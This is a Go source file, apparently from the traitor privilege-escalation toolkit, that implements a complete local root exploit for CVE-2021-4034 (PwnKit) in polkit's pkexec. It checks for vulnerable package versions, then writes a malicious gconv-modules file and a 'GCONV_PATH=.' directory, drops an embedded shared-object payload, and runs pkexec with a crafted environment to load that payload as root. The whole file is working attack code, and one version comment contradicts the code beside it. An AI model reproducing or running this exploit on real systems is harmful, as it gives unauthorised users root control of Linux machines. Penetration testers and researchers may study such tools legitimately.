package exploits

import (
	_ "embed"
	"github.com/liamg/traitor/pkg/logger"
	"github.com/liamg/traitor/pkg/payloads"
	"log"

	//"flag"
	"context"
	"fmt"
	"io/ioutil"

	"github.com/hashicorp/go-version"
	"github.com/liamg/traitor/pkg/state"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

const (
	fake_charset = "payload"
	gconv_dir    = "gconv"
)

var (
	gconv_content = "module  PAYLOAD//    INTERNAL    ../payload    2\nmodule  INTERNAL    PAYLOAD//    ../payload    2"
)

//go:embed cve_2021_4034.so
var payloadso []byte //this cve_2021_4034.so is compiled from ../payloads/cve_2021_4034.go

func wirteGconvModule() (err error) {
	if err := os.Mkdir(gconv_dir, 0o0755); err != nil {
		return err
	}
	if err := ioutil.WriteFile(fmt.Sprintf("%s/gconv-modules", gconv_dir), []byte(gconv_content), 0o0755); err != nil {
		log.Fatal(err)
	}
	return nil
}

type cve20214034Exploit struct {
}

//var simpleVersionRegex = regexp.MustCompile("^[0-9\\.\\-]+")

func NewCVE20214034Exploit() *cve20214034Exploit {
	exp := &cve20214034Exploit{}
	return exp
}

func init() {
	register("polkit:CVE-2021-4034", SpeedFast, NewCVE20214034Exploit())
}

func (v *cve20214034Exploit) isVulnerableDebian(s *state.State) bool {

	if !s.IsDebianLike() {
		return false
	}

	out, err := exec.Command("sh", "-c", "apt info policykit-1 | grep 'Version:'").Output()
	if err != nil {
		return false
	}

	fields := strings.Fields(string(out))
	if len(fields) < 2 {
		return false
	}

	simpleVersion := simpleVersionRegex.FindString(fields[1])

	actual, err := version.NewVersion(simpleVersion)
	if err != nil {
		return false
	}

	vulnerable, err := version.NewVersion("0.105-26") // vuln was introduced in 0.105-26
	if err != nil {
		return false
	}
	patched, err := version.NewVersion("0.105-31") // vuln was patched in 0.105-31
	if err != nil {
		return false
	}

	return actual.GreaterThanOrEqual(vulnerable) && actual.LessThan(patched)
}

func (v *cve20214034Exploit) isVulnerableOther() bool {

	output, err := exec.Command("pkcheck", "--version").Output()
	if err != nil {
		return false
	}

	fields := strings.Fields(string(output))
	actualVersion := fields[len(fields)-1]
	actual, err := version.NewVersion(actualVersion)
	if err != nil {
		return false
	}

	vulnerable, err := version.NewVersion("0.113") // vuln was introduced in 0.113
	if err != nil {
		return false
	}
	patched, err := version.NewVersion("0.119") // vuln was patched in 0.113
	if err != nil {
		return false
	}

	return actual.GreaterThanOrEqual(vulnerable) && actual.LessThan(patched)
}

func (v *cve20214034Exploit) IsVulnerable(_ context.Context, s *state.State, log logger.Logger) bool {

	// two different forks are versioned differently
	if !v.isVulnerableDebian(s) && !v.isVulnerableOther() {
		return false
	}

	if !s.IsPackageInstalled("gnome-control-center") || !s.IsPackageInstalled("accountsservice") {
		// if required packages aren't installed, we may be able to install them with package kit...
		if !s.IsPackageInstalled("packagekit") {
			return false
		}
	}

	log.Printf("Polkit version is vulnerable!")
	return true
}

func (v *cve20214034Exploit) Shell(ctx context.Context, s *state.State, log logger.Logger) error {
	return v.Exploit(ctx, s, log, payloads.Defer)
}

func (v *cve20214034Exploit) Exploit(ctx context.Context, s *state.State, log logger.Logger, payload payloads.Payload) error {

	target := "/usr/bin/pkexec"
	if err := wirteGconvModule(); err != nil {
		log.Printf("Unable to write gconv module: %v", err)
		os.Exit(1)
		//log.Fatalf()
	}
	if err := os.Mkdir("GCONV_PATH=.", 0o0755); err != nil {
		log.Printf("Unable to make tmp dir: %v", err)
		os.Exit(1)
	}
	if err := ioutil.WriteFile("payload.so", payloadso, 0o0755); err != nil {
		log.Printf("Unable to write  payload: %v", err)
		os.Exit(1)
	}
	if err := ioutil.WriteFile(fmt.Sprintf("GCONV_PATH=./%s", gconv_dir), []byte("\x00"), 0o0755); err != nil {
		log.Printf("Unable to write tmp file: %v", err)
		os.Exit(1)
	}

	if err := syscall.Exec(target, nil, []string{
		gconv_dir,
		"PATH=GCONV_PATH=.",
		"SHELL=/fake/shell",
		"GIO_USE_VFS=AAAAAAAAAAAAAAAAAAAAAA", // prevent pkexec from calling setenv and clone the enviroment on the heap *1
		fmt.Sprintf("CHARSET=%s", fake_charset),
	}); err != nil {
		log.Printf("Unable to execute pkexec: %v", err)
		os.Exit(1)
	}

	return nil
}
